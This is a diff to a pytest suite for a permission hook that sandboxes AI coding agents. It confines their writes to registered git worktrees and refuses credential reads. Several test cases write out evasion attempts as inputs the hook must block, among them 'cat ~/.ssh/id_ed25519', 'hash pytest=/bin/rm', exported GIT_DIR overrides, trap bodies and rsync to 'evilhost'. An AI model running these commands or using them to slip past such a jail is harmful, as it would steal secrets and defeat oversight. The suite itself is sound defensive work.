@@ -9,6 +9,7 @@ from pathlib import Path
 from typing import Any
 
 import pytest
+from lib import jail
 from lib.config import Config, LedgerDecl
 from lib.jail import CONDUCTOR_GIT, KNOWN_AGENTS, decide, split_pipeline, tokenize
 
@@ -21,6 +22,23 @@ CFG = Config(
         Path("/work/Charter/decision-log.md"), "markdown-table-row", "{seq:04d}", "last-row-id"
     ),
 )
+
+
+WT = f"{CWD}/.claude/worktrees/20261015-120000-u1"
+FAKE_UNITS = frozenset({f"{CWD}/.claude/worktrees/u1", WT})
+
+
+@pytest.fixture(autouse=True)
+def _fake_unit_worktrees(monkeypatch: pytest.MonkeyPatch) -> None:
+    # 0022: CWD is not a real repo; register its fake unit worktrees, real repos query git.
+    real = getattr(jail, "_registered_worktrees", None)
+
+    def fake(repo: str) -> frozenset[str]:
+        if repo == CWD:
+            return FAKE_UNITS
+        return real(repo) if real is not None else frozenset()
+
+    monkeypatch.setattr(jail, "_registered_worktrees", fake, raising=False)
 
 
 def _w(agent: str | None, path: str, tool: str = "Write") -> dict[str, Any]:
@@ -59,16 +77,33 @@ def test_known_agents_match_spec_matrix() -> None:
     )
 
 
-def test_unknown_agent_fails_closed() -> None:
-    d = decide(_b("mystery", "ls"), CFG)
+def test_unknown_agent_fails_closed(tmp_path: Path) -> None:
+    # 0023: a foreign agent is refused only while a train is active.
+    (tmp_path / ".claude" / "daedalus").mkdir(parents=True)
+    (tmp_path / ".claude" / "daedalus" / "train.active").write_text("20261015-120000\n")
+    payload = {**_b("mystery", "ls"), "cwd": str(tmp_path)}
+    d = decide(payload, CFG)
     assert not d.allow and "fail closed" in d.reason and d.reason.endswith(".")
+
+
+def test_unknown_agent_refusal_names_the_marker_and_unmark(tmp_path: Path) -> None:
+    # 0023: a marker left by a dead train must be recoverable from the refusal text alone.
+    marker = tmp_path / ".claude" / "daedalus" / "train.active"
+    marker.parent.mkdir(parents=True)
+    marker.write_text("20261015-120000\n")
+    payload = {**_b("Explore", "ls"), "cwd": str(tmp_path)}
+    reason = str(decide(payload, CFG).reason)
+    assert str(marker) in reason and len(reason.splitlines()) == 2
+    unmark = "scripts/daedalus_workspace.py unmark --repo " + str(tmp_path) + " "
+    assert "Next: if no Daedalus train is running, run python3 ${CLAUDE_PLUGIN_ROOT}/" in reason
+    assert unmark in reason
 
 
 def test_every_block_reason_has_next() -> None:
     cases = [
         _w("security-auditor", f"{CWD}/src/a.py"),
         _b("web-researcher", "ls"),
-        _b("x", "ls"),
+        _b("daedalus:x", "ls"),
         _w("repo-coder", f"{CWD}/infra/a.tf"),
         _b("repo-coder", "git push origin x"),
     ]
@@ -156,12 +191,19 @@ def test_bare_main_still_allows() -> None:
     assert decide(_b(None, "git status"), CFG).allow
 
 
-@pytest.mark.parametrize(
-    "agent",
-    ["otherplugin:repo-coder", "daedalus-x:repo-coder", "daedalus:", "daedalus:mystery"],
-)
-def test_foreign_or_empty_namespace_fails_closed(agent: str) -> None:
+@pytest.mark.parametrize("agent", ["daedalus:", "daedalus:mystery"])
+def test_empty_or_unknown_daedalus_name_fails_closed(agent: str) -> None:
     d = decide(_b(agent, "pytest -q"), CFG)
+    assert not d.allow and "fail closed" in d.reason
+
+
+@pytest.mark.parametrize("agent", ["otherplugin:repo-coder", "daedalus-x:repo-coder"])
+def test_foreign_namespace_fails_closed_only_during_a_train(agent: str, tmp_path: Path) -> None:
+    payload = {**_b(agent, "pytest -q"), "cwd": str(tmp_path)}
+    assert decide(payload, CFG).allow
+    (tmp_path / ".claude" / "daedalus").mkdir(parents=True)
+    (tmp_path / ".claude" / "daedalus" / "train.active").write_text("20261015-120000\n")
+    d = decide(payload, CFG)
     assert not d.allow and "fail closed" in d.reason
 
 
@@ -184,8 +226,9 @@ def test_main_cannot_write_application_code() -> None:
 
 class TestRepoCoder:
     def test_writes_inside_src_and_tests_only(self) -> None:
-        assert decide(_w("repo-coder", f"{CWD}/src/a.py"), CFG).allow
-        assert decide(_w("repo-coder", f"{CWD}/tests/test_a.py", "Edit"), CFG).allow
+        # 0022: the main checkout's src/ and tests/ are refused; see TestUnitWorktree.
+        assert not decide(_w("repo-coder", f"{CWD}/src/a.py"), CFG).allow
+        assert not decide(_w("repo-coder", f"{CWD}/tests/test_a.py", "Edit"), CFG).allow
         assert not decide(_w("repo-coder", f"{CWD}/service-manifest.json"), CFG).allow
         assert not decide(_w("repo-coder", f"{CWD}/src/../infra/a.tf"), CFG).allow
         assert not decide(_w("repo-coder", "/other/repo/src/a.py"), CFG).allow
@@ -214,7 +257,7 @@ class TestRepoCoder:
         for command in (
             "pytest -q",
             "npm run test:unit",
-            "git add -A && git commit -m 'WIP: yield'",
+            f"git -C {WT} add -A && git -C {WT} commit -m 'WIP: yield'",
             "git diff",
         ):
             assert decide(_b("repo-coder", command), CFG).allow, command
@@ -573,7 +616,8 @@ class TestRegressionRepoCoder:
         assert not decide(_b("repo-coder", command), CFG).allow, command
 
     def test_relative_paths_resolve_against_cwd(self) -> None:
-        assert decide(_w("repo-coder", "src/a.py"), CFG).allow
+        assert not decide(_w("repo-coder", "src/a.py"), CFG).allow
+        assert decide(_w("repo-coder", ".claude/worktrees/u1/src/a.py"), CFG).allow
         assert not decide(_w("repo-coder", "infra/a.tf"), CFG).allow
         assert not decide(_w(None, "src/app.py"), CFG).allow
 
@@ -586,7 +630,8 @@ class TestRegressionRepoCoder:
                 "agent_type": "repo-coder",
             }
 
-        assert decide(nb(f"{CWD}/src/n.ipynb"), CFG).allow
+        assert decide(nb(f"{CWD}/.claude/worktrees/u1/src/n.ipynb"), CFG).allow
+        assert not decide(nb(f"{CWD}/src/n.ipynb"), CFG).allow
         assert not decide(nb(f"{CWD}/docs/n.ipynb"), CFG).allow
 
 
@@ -867,11 +912,11 @@ class TestRound3Breakage:
 
     def test_quoted_separators_in_commit_message(self) -> None:
         for command in (
-            "git commit -m 'fix: a; b'",
-            "git commit -m 'a > b'",
-            "git commit -m 'a | b && c'",
-            "git commit -m 'cost: $5'",
-            "git commit -m 'fix curl handling'",
+            f"git -C {WT} commit -m 'fix: a; b'",
+            f"git -C {WT} commit -m 'a > b'",
+            f"git -C {WT} commit -m 'a | b && c'",
+            f"git -C {WT} commit -m 'cost: $5'",
+            f"git -C {WT} commit -m 'fix curl handling'",
         ):
             assert decide(_b("repo-coder", command), CFG).allow, command
 
@@ -1478,6 +1523,9 @@ class TestFinalCoderGitAllowlist:
             "git checkout -- docs/x.md",
             "git restore docs/x.md",
             "git restore -- ../other/a.py",
+            "git restore -- src/a.py",
+            "git checkout -- tests/test_a.py src/b.py",
+            "git checkout -- .claude/worktrees/u1/src/a.py src/b.py",
             "git stash drop",
             "git stash",
             "git merge x",
@@ -1495,8 +1543,9 @@ class TestFinalCoderGitAllowlist:
             "git stash list",
             "git stash push -m wip",
             "git stash pop",
-            "git restore -- src/a.py",
-            "git checkout -- tests/test_a.py src/b.py",
+            "git restore -- .claude/worktrees/u1/src/a.py",
+            "git checkout -- .claude/worktrees/u1/tests/test_a.py .claude/worktrees/u1/src/b.py",
+            "git -C .claude/worktrees/u1 restore -- src/a.py",
             "git branch",
             "git branch --show-current",
             "git worktree list",
@@ -1632,18 +1681,35 @@ class TestFinalCoderWriteTargets:
     @pytest.mark.parametrize(
         "command",
         [
-            "cp src/a.py src/b.py",
-            "sed -i s/a/b/ src/a.py",
-            "tee tests/out.txt",
-            "mv src/a.py tests/a.py",
-            "install -m 644 src/a.py src/b.py",
-            "truncate -s 0 tests/out.txt",
+            "cp .claude/worktrees/u1/src/a.py .claude/worktrees/u1/src/b.py",
+            "sed -i s/a/b/ .claude/worktrees/u1/src/a.py",
+            "tee .claude/worktrees/u1/tests/out.txt",
+            "mv .claude/worktrees/u1/src/a.py .claude/worktrees/u1/tests/a.py",
+            "install -m 644 .claude/worktrees/u1/src/a.py .claude/worktrees/u1/src/b.py",
+            "truncate -s 0 .claude/worktrees/u1/tests/out.txt",
             "sed -n 1p docs/x.md",
-            "sed --in-place=.bak s/a/b/ src/a.py",
+            "sed --in-place=.bak s/a/b/ .claude/worktrees/u1/src/a.py",
         ],
     )
     def test_allowed(self, command: str) -> None:
         assert decide(_b("repo-coder", command), CFG).allow, command
+
+    @pytest.mark.parametrize(
+        "command",
+        [
+            "cp src/a.py src/b.py",
+            "sed -i s/a/b/ src/a.py",
+            "tee tests/out.txt",
+            "mv .claude/worktrees/u1/src/a.py tests/a.py",
+            "install -m 644 src/a.py src/b.py",
+            "truncate -s 0 tests/out.txt",
+            "sed --in-place=.bak s/a/b/ src/a.py",
+        ],
+    )
+    def test_main_checkout_blocked(self, command: str) -> None:
+        # 0022: the same grammar aimed at the main checkout is refused.
+        d = decide(_b("repo-coder", command), CFG)
+        assert not d.allow and d.reason.startswith("Bash write outside src/ or tests/"), command
 
 
 class TestFinalDataDir:
@@ -1804,7 +1870,8 @@ class TestProjectDataDir:
     )
     def test_ordinary_git_add_commit_allowed(self, command: str) -> None:
         assert decide(_b(None, command), CFG).allow, command
-        assert decide(_b("repo-coder", command), CFG).allow, command
+        # 0022: the coder runs the same command inside its unit worktree.
+        assert decide(_b("repo-coder", f"git -C {WT} {command[4:]}"), CFG).allow, command
 
     @pytest.mark.parametrize(
         "command",
@@ -2213,3 +2280,842 @@ class TestFixWaveCharterDocsBash:
     )
     def test_allowed(self, command: str) -> None:
         assert decide(_b("charter-docs", command), CFG).allow, command
+
+
+def test_coder_writes_inside_a_unit_worktree() -> None:
+    # 0022: the coder's cwd is the main checkout; its code dirs live in the unit worktree.
+    assert decide(_w("repo-coder", f"{WT}/src/a.py"), CFG).allow
+    assert decide(_w("repo-coder", f"{WT}/tests/test_a.py", "Edit"), CFG).allow
+    assert decide(_b("repo-coder", f"cp {WT}/src/a.py {WT}/src/b.py"), CFG).allow
+
+
+@pytest.mark.parametrize(
+    "path",
+    [
+        f"{WT}/infra/a.tf",
+        f"{WT}/README.md",
+        f"{CWD}/.claude/worktrees/src/a.py",
+        f"{CWD}/.claude/worktrees/x/../../daedalus/src/a.py",
+        "/other/repo/.claude/worktrees/u1/src/a.py",
+    ],
+)
+def test_coder_unit_worktree_outside_code_dirs_is_refused(path: str) -> None:
+    assert not decide(_w("repo-coder", path), CFG).allow, path
+
+
+def test_main_never_writes_unit_worktree_code() -> None:
+    d = decide(_w(None, f"{WT}/src/a.py"), CFG)
+    assert not d.allow and "Fable does not write application code" in str(d.reason)
+
+
+def test_coder_restores_paths_inside_its_unit_worktree() -> None:
+    assert decide(_b("repo-coder", f"git restore -- {WT}/src/a.py"), CFG).allow
+
+
+def test_coder_cannot_write_the_main_checkout() -> None:
+    # 0022: coders own a unit worktree; the main checkout is never their write target.
+    assert not decide(_w("repo-coder", f"{CWD}/src/a.py"), CFG).allow
+    assert not decide(_w("repo-coder", f"{CWD}/tests/test_a.py", "Edit"), CFG).allow
+    assert not decide(_b("repo-coder", f"cp a {CWD}/src/b.py"), CFG).allow
+    assert not decide(_b("repo-coder", f"git restore -- {CWD}/src/a.py"), CFG).allow
+
+
+def test_coder_pathspec_resolves_against_git_dash_c() -> None:
+    # 0022: a relative pathspec names a path under the -C directory, else under cwd.
+    assert decide(_b("repo-coder", f"git -C {WT} restore -- src/a.py"), CFG).allow
+    assert decide(_b("repo-coder", f"git -C {WT} checkout -- tests/test_a.py"), CFG).allow
+    assert not decide(_b("repo-coder", f"git -C {CWD} restore -- src/a.py"), CFG).allow
+    assert not decide(_b("repo-coder", f"git -C {WT} restore -- ../../../src/a.py"), CFG).allow
+    assert not decide(_b("repo-coder", f"git -C {WT} restore -- README.md"), CFG).allow
+    assert decide(_b("repo-coder", f"git restore -- {WT}/src/a.py"), CFG).allow
+
+
+def _unit_repo(path: Path) -> tuple[Path, Path]:
+    repo = _git_init(path)
+    git = ["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t"]
+    git += ["-c", "commit.gpgsign=false"]
+    subprocess.run([*git, "commit", "-q", "--allow-empty", "-m", "init"], check=True)
+    wt = repo / ".claude" / "worktrees" / "u1"
+    subprocess.run([*git, "worktree", "add", "-q", "-b", "daedalus-unit/u1", str(wt)], check=True)
+    return repo, wt.resolve()
+
+
+def _cwd(payload: dict[str, Any], cwd: Path) -> dict[str, Any]:
+    payload["cwd"] = str(cwd)
+    return payload
+
+
+def test_coder_unit_worktree_through_a_symlinked_root(tmp_path: Path) -> None:
+    # 0022: a symlinked path to the repo and the real path resolve to one worktree base.
+    repo, _ = _unit_repo(tmp_path / "real")
+    link = tmp_path / "link"
+    link.symlink_to(repo)
+    for cwd, root in ((link, repo), (repo, link), (link, link)):
+        payload = _w("repo-coder", f"{root}/.claude/worktrees/u1/src/a.py")
+        payload["cwd"] = str(cwd)
+        assert decide(payload, CFG).allow, (cwd, root)
+        payload = _w("repo-coder", f"{root}/src/a.py")
+        payload["cwd"] = str(cwd)
+        assert not decide(payload, CFG).allow, (cwd, root)
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"git -C {WT}/src restore -- :/README.md",
+        f"git -C {WT}/src checkout -- :/",
+        f"git -C {WT}/src restore -- ':(top)src/a.py'",
+        f"git -C {WT} restore -- ':!src/a.py'",
+        f"git -C {WT} add :/",
+        f"git -C {WT} commit -m x -- :/",
+    ],
+)
+def test_coder_pathspec_magic_is_refused(command: str) -> None:
+    # 0022: :/ and :(top) are worktree-top relative; the jail cannot resolve them lexically.
+    assert not decide(_b("repo-coder", command), CFG).allow, command
+
+
+@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"export GIT_WORK_TREE={CWD}; git -C {WT} restore -- src/a.py",
+        f"export GIT_DIR={CWD}/.git; git -C {WT} restore -- src/a.py",
+        f"export GIT_WORK_TREE={CWD}; git -C {WT}/src restore -- :/src/a.py",
+        f"declare -x FOO=1; tee {WT}/src/a.py",
+        "typeset -x FOO=1",
+        "readonly FOO=1",
+        "export FOO",
+        "set -a",
+        "set -ea",
+        "set -o allexport",
+    ],
+)
+def test_worker_shell_variable_export_is_refused(agent: str, command: str) -> None:
+    d = decide(_b(agent, command), CFG)
+    assert not d.allow and "shell variables" in str(d.reason), (agent, command)
+
+
+def test_coder_plain_unit_worktree_bash_write_still_allowed() -> None:
+    assert decide(_b("repo-coder", f"tee {WT}/src/a.py"), CFG).allow
+    assert decide(_b("repo-coder", "set -e"), CFG).allow
+
+
+def test_coder_unregistered_worktree_dir_is_refused(tmp_path: Path) -> None:
+    # 0022: only a git-registered worktree under .claude/worktrees is a unit worktree.
+    repo, wt = _unit_repo(tmp_path / "repo")
+    evil = repo / ".claude" / "worktrees" / "evil"
+    (evil / "src").mkdir(parents=True)
+    assert decide(_cwd(_w("repo-coder", f"{wt}/src/a.py"), repo), CFG).allow
+    assert not decide(_cwd(_w("repo-coder", f"{evil}/src/a.py"), repo), CFG).allow
+    assert not decide(_cwd(_b("repo-coder", f"tee {evil}/src/a.py"), repo), CFG).allow
+    assert not decide(_w("repo-coder", f"{CWD}/.claude/worktrees/u2/src/a.py"), CFG).allow
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"mkdir -p {CWD}/.claude/worktrees/evil/src",
+        "mkdir -p .claude/worktrees/evil/src",
+        "touch infra/a.tf",
+        f"rm {CWD}/infra/a.tf",
+        f"rmdir {CWD}/infra/x",
+        f"unlink {CWD}/src/a.py",
+        f"chmod 755 {CWD}/scripts/a.sh",
+    ],
+)
+def test_coder_file_mutators_outside_unit_worktree_are_refused(command: str) -> None:
+    assert not decide(_b("repo-coder", command), CFG).allow, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"mkdir -p {WT}/src/pkg",
+        f"touch {WT}/tests/__init__.py",
+        f"rm {WT}/src/old.py",
+        f"chmod 755 {WT}/src/run.py",
+    ],
+)
+def test_coder_file_mutators_inside_unit_worktree_are_allowed(command: str) -> None:
+    assert decide(_b("repo-coder", command), CFG).allow, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"cd {CWD}/infra && tee .claude/worktrees/u1/src/a.py",
+        "pushd /tmp && tee .claude/worktrees/u1/src/a.py",
+        "cd /tmp && git restore -- .claude/worktrees/u1/src/a.py",
+        "cd /tmp && git -C .claude/worktrees/u1 restore -- src/a.py",
+        "cd /tmp; cp .claude/worktrees/u1/src/a.py .claude/worktrees/u1/src/b.py",
+    ],
+)
+def test_coder_relative_write_after_cd_is_refused(command: str) -> None:
+    # 0022: relative operands after cd resolve against the hook cwd, not the cd target.
+    d = decide(_b("repo-coder", command), CFG)
+    assert not d.allow and "absolute" in str(d.reason), command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"cd {WT} && tee {WT}/src/a.py",
+        f"cd /tmp && git -C {WT} restore -- src/a.py",
+        f"cd {WT} && python3 -m pytest -q",
+    ],
+)
+def test_coder_absolute_write_after_cd_is_allowed(command: str) -> None:
+    assert decide(_b("repo-coder", command), CFG).allow, command
+
+
+def test_coder_cwd_inside_a_real_unit_worktree(tmp_path: Path) -> None:
+    # 0022: a hook cwd of the worktree or its src/ still binds writes to that worktree.
+    repo, wt = _unit_repo(tmp_path / "repo")
+    (wt / "src").mkdir()
+    for cwd in (wt, wt / "src"):
+        assert decide(_cwd(_w("repo-coder", f"{wt}/src/a.py"), cwd), CFG).allow, cwd
+        assert decide(_cwd(_w("repo-coder", f"{wt}/tests/t.py"), cwd), CFG).allow, cwd
+        assert not decide(_cwd(_w("repo-coder", f"{repo}/src/a.py"), cwd), CFG).allow, cwd
+        assert not decide(_cwd(_w("repo-coder", f"{wt}/README.md"), cwd), CFG).allow, cwd
+    assert decide(_cwd(_w("repo-coder", "src/a.py"), wt), CFG).allow
+
+
+@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"hash pytest=/bin/rm; pytest {CWD}/infra/a.tf",
+        "hash -p /bin/rm pytest; pytest x",
+        f"alias git=tee; git -C {WT} status",
+        "unalias ls",
+        "unset PATH; git status",
+        "shopt -s expand_aliases",
+        "enable -n test",
+        "setopt aliases",
+        "unsetopt hashcmds",
+        "builtin cd /tmp",
+        "command rm x",
+        "eval ls",
+        "exec ls",
+        "source x.sh",
+        ". x.sh",
+    ],
+)
+def test_worker_shell_state_builtins_are_refused(agent: str, command: str) -> None:
+    # 0022: a builtin that rebinds what a later segment runs voids every later check.
+    assert not decide(_b(agent, command), CFG).allow, (agent, command)
+
+
+def test_coder_plain_git_status_in_unit_worktree_allowed() -> None:
+    assert decide(_b("repo-coder", f"git -C {WT} status"), CFG).allow
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "mkdir newdir",
+        "touch NEWFILE",
+        "mkdir -m 700 infra2",
+        f"chown x {CWD}/infra/a.tf",
+        f"chgrp x {CWD}/infra/a.tf",
+        f"chown x:y {WT}/src/a.py {CWD}/infra/a.tf",
+        f"install --mode=644 {WT}/src/a.py {CWD}/bin/a",
+        f"find {CWD}/infra -delete",
+        f"find {WT}/src -exec rm {{}} +",
+        f"find {WT}/src -fprint {CWD}/x",
+    ],
+)
+def test_coder_bare_and_owner_operands_are_paths(command: str) -> None:
+    # 0022: every non-option operand of a coder write command is a path, no heuristic.
+    assert not decide(_b("repo-coder", command), CFG).allow, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"mkdir {WT}/src/pkg",
+        f"mkdir -m 700 {WT}/src/pkg",
+        f"touch {WT}/tests/__init__.py",
+        f"chown x {WT}/src/a.py",
+        f"chmod 755 {WT}/src/a.py",
+        f"install -m 644 -o x {WT}/src/a.py {WT}/src/b.py",
+        f"install --mode=644 {WT}/src/a.py {WT}/src/b.py",
+        f"truncate -s 0 {WT}/tests/out.txt",
+        f"find {WT}/src -name '*.py'",
+    ],
+)
+def test_coder_unit_worktree_operands_allowed(command: str) -> None:
+    assert decide(_b("repo-coder", command), CFG).allow, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        "git add -A",
+        "git add .",
+        "git add -- src/a.py",
+        "git commit -m x",
+        "git commit -a -m x",
+        f"git -C {CWD} add -A",
+        f"git -C {CWD}/.claude/worktrees/evil commit -m x",
+        f"cd {CWD}/.claude/worktrees/u1 && git commit -a -m x",
+    ],
+)
+def test_coder_add_and_commit_outside_unit_worktree_refused(command: str) -> None:
+    # 0022: staging or committing in the main checkout lands on the main branch.
+    assert not decide(_b("repo-coder", command), CFG).allow, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"git -C {WT} add -A",
+        f"git -C {WT} add -- {WT}/src/a.py",
+        f"git -C {WT} commit -m 'WIP: yield'",
+        f"git -C {WT}/src commit -m x",
+    ],
+)
+def test_coder_add_and_commit_in_unit_worktree_allowed(command: str) -> None:
+    assert decide(_b("repo-coder", command), CFG).allow, command
+
+
+def test_coder_add_and_commit_with_cwd_in_real_unit_worktree(tmp_path: Path) -> None:
+    repo, wt = _unit_repo(tmp_path / "repo")
+    assert decide(_cwd(_b("repo-coder", "git add -A"), wt), CFG).allow
+    assert decide(_cwd(_b("repo-coder", "git commit -m x"), wt), CFG).allow
+    assert not decide(_cwd(_b("repo-coder", "git add -A"), repo), CFG).allow
+
+
+@pytest.mark.parametrize("agent", ["repo-coder", "contract-spec", "charter-docs"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"trap 'git -C {CWD} commit -am x' EXIT; ls",
+        f"printf -v PATH {CWD}/bin; pytest {CWD}/infra/a.tf",
+        "printf -vPATH x",
+        "getopts PATH x; git status",
+    ],
+)
+def test_worker_trap_getopts_printf_v_refused(agent: str, command: str) -> None:
+    # 0022: a trap body runs unchecked; printf -v and getopts rebind a variable such as PATH.
+    assert not decide(_b(agent, command), CFG).allow, (agent, command)
+
+
+def test_coder_plain_printf_allowed() -> None:
+    assert decide(_b("repo-coder", "printf 'x y'"), CFG).allow
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"cp -t{CWD}/infra {WT}/src/a.py",
+        f"mv -t{CWD}/infra {WT}/src/a.py",
+        f"cp -rt{CWD}/infra {WT}/src/a.py",
+        f"install -t {CWD}/infra {WT}/src/a.py",
+        f"ln -st{CWD}/infra {WT}/src/a.py",
+        f"touch -r{CWD}/infra/a.tf {WT}/src/a.py",
+        f"rsync {WT}/src/a.py evilhost:x",
+        f"rsync -e touch {WT}/src/a.py evilhost:x",
+        f"rsync -avze ssh {WT}/src/ {WT}/src/pkg/",
+        f"rsync --rsh=ssh {WT}/src/ {WT}/src/pkg/",
+        f"rsync {WT}/src/a.py rsync://host/x",
+        f"rsync --exclude x {CWD}/infra/ {WT}/src/pkg/",
+    ],
+)
+def test_coder_attached_targets_and_remote_rsync_refused(command: str) -> None:
+    # 0022: an attached -t<dir> is a write target; host:path is a remote rsync operand.
+    assert not decide(_b("repo-coder", command), CFG).allow, command
+
+
+def test_coder_rsync_remote_refused_from_unit_worktree_cwd(tmp_path: Path) -> None:
+    _, wt = _unit_repo(tmp_path / "repo")
+    (wt / "src").mkdir()
+    for command in (f"rsync {wt}/src/a.py evilhost:x", f"rsync -e touch {wt}/src/a.py evilhost:x"):
+        assert not decide(_cwd(_b("repo-coder", command), wt / "src"), CFG).allow, command
+
+
+@pytest.mark.parametrize(
+    "command",
+    [
+        f"cp -t {WT}/src/pkg {WT}/src/a.py",
+        f"cp -t{WT}/src/pkg {WT}/src/a.py",
+        f"cp --target-directory={WT}/src/pkg {WT}/src/a.py",
+        f"cp --preserve=mode {WT}/src/a.py {WT}/src/b.py",
+        f"rsync -a {WT}/src/ {WT}/src/pkg/",
+        f"rsync -a --exclude '*.pyc' {WT}/src/ {WT}/src/pkg/",
+        f"rsync -a --filter '- *.pyc' --chmod u+w {WT}/src/ {WT}/src/pkg/",
+        f"mkdir -pm 700 {WT}/src/pkg",
+        f"mkdir -m700 {WT}/src/pkg",
+        f"install --mode 644 {WT}/src/a.py {WT}/src/b.py",
+        f"touch --date 2026-01-01 {WT}/src/a.py",
+    ],
+)
+def test_coder_value_options_skipped_as_non_paths(command: str) -> None:
+    assert decide(_b("repo-coder", command), CFG).allow, command
+
+
+CREDENTIAL_PATHS = [
+    ".ssh/id_ed25519",
+    ".aws/credentials",
+    ".aws/config",
+    ".gnupg/pubring.kbx",
+    ".config/gh/hosts.yml",
+    ".claude/.credentials.json",
+]
+CREDENTIAL_AGENTS = [None, "repo-coder", "security-auditor", "Explore"]
+
+
+@pytest.fixture
+def cred_home(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> Path:
+    root = tmp_path.resolve() / "home"
+    root.mkdir()
+    monkeypatch.setenv("HOME", str(root))
+    return root
+
+
+@pytest.fixture
+def train_cwd(tmp_path: Path) -> Path:
+    root = tmp_path.resolve() / "trainrepo"
+    (root / ".claude" / "daedalus").mkdir(parents=True)
+    return root
+
+
+def _mark(cwd: Path) -> None:
+    (cwd / ".claude" / "daedalus" / "train.active").write_text("20261015-120000\n")
+
+
+def _cred(agent: str | None, tool: str, cwd: str = CWD, **tool_input: str) -> dict[str, Any]:
+    payload: dict[str, Any] = {"tool_name": tool, "tool_input": tool_input, "cwd": cwd}
+    if agent:
+        payload["agent_type"] = agent
+    return payload
+
+
+def _refusal(path: str) -> str:
+    return (
+        f"{path} is a credential path. "
+        "Next: Daedalus never reads credentials; use the tool that needs them from your own shell"
+    )
+
+
+@pytest.mark.parametrize("agent", CREDENTIAL_AGENTS)
+@pytest.mark.parametrize("rel", CREDENTIAL_PATHS)
+def test_read_of_a_credential_path_is_refused(cred_home: Path, agent: str | None, rel: str) -> None:
+    # spec 8: every agent, main included.
+    path = str(cred_home / rel)
+    d = decide(_cred(agent, "Read", file_path=path), CFG)
+    assert not d.allow and d.reason == _refusal(path)
+    d = decide(_cred(agent, "Read", file_path=f"~/{rel}"), CFG)
+    assert not d.allow and d.reason == _refusal(path)
+
+
+@pytest.mark.parametrize("agent", CREDENTIAL_AGENTS)
+def test_glob_and_grep_into_credentials_are_refused(cred_home: Path, agent: str | None) -> None:
+    for payload in (
+        _cred(agent, "Glob", pattern="*", path=str(cred_home / ".ssh")),
+        _cred(agent, "Glob", pattern=f"{cred_home}/.gnupg/*"),
+        _cred(agent, "Glob", pattern="~/.aws/*"),
+        _cred(agent, "Glob", pattern="**/id_ed25519", path=str(cred_home)),
+        _cred(agent, "Glob", pattern=".ss?/*", path=str(cred_home)),
+        _cred(agent, "Glob", pattern=".ssh/*", cwd=str(cred_home)),
+        _cred(agent, "Grep", pattern="aws_secret", path=str(cred_home / ".aws")),
+        _cred(agent, "Grep", pattern="token", path="~/.config/gh"),
+        _cred(agent, "Grep", pattern="~/.ssh/id_ed25519"),
+    ):
+        d = decide(payload, CFG)
+        assert not d.allow and "is a credential path" in str(d.reason), payload
+
+
+@pytest.mark.parametrize("agent", CREDENTIAL_AGENTS)
+def test_grep_regex_and_project_globs_are_allowed(cred_home: Path, agent: str | None) -> None:
+    for payload in (
+        _cred(agent, "Grep", pattern="[a-z]+ssh", path=CWD),
+        _cred(agent, "Grep", pattern=".*aws.*"),
+        _cred(agent, "Glob", pattern="**/*.py", path=CWD),
+        _cred(agent, "Glob", pattern="*.md", path=str(cred_home / ".claude")),
+    ):
+        assert decide(payload, CFG).allow, payload
+
+
+@pytest.mark.parametrize("agent", [None, "repo-coder", "Explore"])
+@pytest.mark.parametrize(
+    "command",
+    [
+        "cat ~/.ssh/id_ed25519",
+        "cat $HOME/.aws/credentials",
+        "cat ${HOME}/.gnupg/pubring.kbx",
+        'cat "$HOME"/.ssh/id_ed25519',
+        "cat '~/.aws/config'",
+        "ls ~/.config/gh",
+        "head -c 10 ~/.claude/.credentials.json",
+        "cp --target-directory=~/.ssh/x a",
+        "cat ~/.ss*/id_ed25519",
+        "cat ~/.{ssh,aws}/x",
+        "cd ~ && cat .ssh/id_ed25519",
+        "cd && cat .aws/credentials",
+        "cat ~/keys/id_ed25519",
+    ],
+)
+def test_bash_naming_a_credential_path_is_refused(
+    cred_home: Path, agent: str | None, command: str
+) -> None:
+    (cred_home / ".ssh").mkdir()
+    (cred_home / "keys").symlink_to(cred_home / ".ssh")
+    d = decide(_b(agent, command), CFG)
+    assert not d.allow
+    assert "is a credential path. Next: Daedalus never reads credentials" in str(d.reason)
+
+
+def test_bash_absolute_and_parent_glob_credential_paths_are_refused(cred_home: Path) -> None:
+    for command in (
+        f"cat {cred_home}/.ssh/id_ed25519",
+        f"cat {cred_home.parent}/*/.ssh/id_ed25519",
+        f"cat {cred_home}/x/../.aws/config",
+    ):
+        d = decide(_b(None, command), CFG)
+        assert not d.allow and "is a credential path" in str(d.reason), command
+
+
+@pytest.mark.parametrize("agent", CREDENTIAL_AGENTS)
+def test_sibling_paths_outside_the_deny_are_allowed(cred_home: Path, agent: str | None) -> None:
+    for path in (
+        cred_home / ".ssh_notes.txt",
+        cred_home / ".sshx" / "id",
+        cred_home / ".config" / "ghx",
+        cred_home / ".config" / "ghostty" / "config",
+        cred_home / ".claude" / "settings.json",
+    ):
+        assert decide(_cred(agent, "Read", file_path=str(path)), CFG).allow, path
+    for path_text in ("~/.sshx/id", "~/.config/ghx"):
+        assert decide(_cred(agent, "Read", file_path=path_text), CFG).allow, path_text
+
+
+def test_main_bash_siblings_are_allowed(cred_home: Path) -> None:
+    for command in (
+        "cat ~/.config/git/config",
+        "cat ~/.sshx/id",
+        "ls $HOME/.config/ghx",
+        "ls ~/*",
+        "cat ~/*/id_ed25519",
+    ):
+        assert decide(_b(None, command), CFG).allow, command
+
+
+def test_main_bash_dotglob_wildcard_into_credentials_is_refused(cred_home: Path) -> None:
+    d = decide(_b(None, "shopt -s dotglob; cat ~/*/id_ed25519"), CFG)
+    assert not d.allow and "is a credential path" in str(d.reason)
+
+
